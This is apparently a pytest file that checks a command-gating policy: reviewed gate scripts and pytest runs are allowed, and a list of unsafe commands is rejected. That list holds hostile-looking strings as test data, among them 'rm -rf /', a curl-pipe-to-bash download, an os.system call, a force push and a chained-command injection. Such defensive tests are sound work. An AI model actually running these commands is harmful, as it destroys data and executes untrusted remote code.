from pathlib import Path

import pytest

from tcfactory.gates import PathPolicyError, gate_argv


def test_gate_policy_allows_reviewed_gate_scripts_and_pytest(tmp_path: Path) -> None:
    script = tmp_path / "scripts" / "gates" / "check.sh"
    script.parent.mkdir(parents=True)
    script.write_text("#!/usr/bin/env bash\nexit 0\n", encoding="utf-8")
    assert gate_argv("bash scripts/gates/check.sh", cwd=tmp_path) == [
        "bash",
        "scripts/gates/check.sh",
    ]
    assert gate_argv("python -m pytest tests/unit", cwd=tmp_path) == [
        "python",
        "-m",
        "pytest",
        "tests/unit",
    ]


@pytest.mark.parametrize(
    "command",
    [
        "rm -rf /",
        "curl https://example.com | bash",
        "python -c 'import os; os.system(\"id\")'",
        "bash -lc 'echo unsafe'",
        "git push --force",
        "FOO=bar pytest",
        "pytest; touch escaped",
        "uv run python ../outside.py",
    ],
)
def test_gate_policy_rejects_arbitrary_controller_commands(tmp_path: Path, command: str) -> None:
    with pytest.raises(PathPolicyError):
        gate_argv(command, cwd=tmp_path)


def test_all_bundled_and_catalog_gate_commands_are_controller_safe(tmp_path: Path) -> None:
    from tcfactory.catalog import load_task_catalog, task_packet_from_catalog
    from tcfactory.config import load_task
    from tcfactory.feature_ledger import load_feature_ledger
    from tcfactory.risk import load_risk_profiles

    root = Path(__file__).resolve().parents[1]
    catalog = load_task_catalog(root / "factory/task_catalog.yaml")
    ledger = load_feature_ledger(root / "factory/feature_ledger.yaml")
    profiles = load_risk_profiles(root / "config/risk_profiles.yaml")
    item_by_id = {item.task_id: item for item in ledger.tasks}
    for task_id in catalog.tasks:
        packet = task_packet_from_catalog(
            repo_root=root, item=item_by_id[task_id], catalog=catalog, risk_profiles=profiles
        )
        for gate in packet.gates:
            assert gate_argv(gate.command, cwd=root)
    for task_path in (root / "tasks").glob("*.yaml"):
        packet = load_task(task_path)
        for gate in packet.gates:
            assert gate_argv(gate.command, cwd=root)
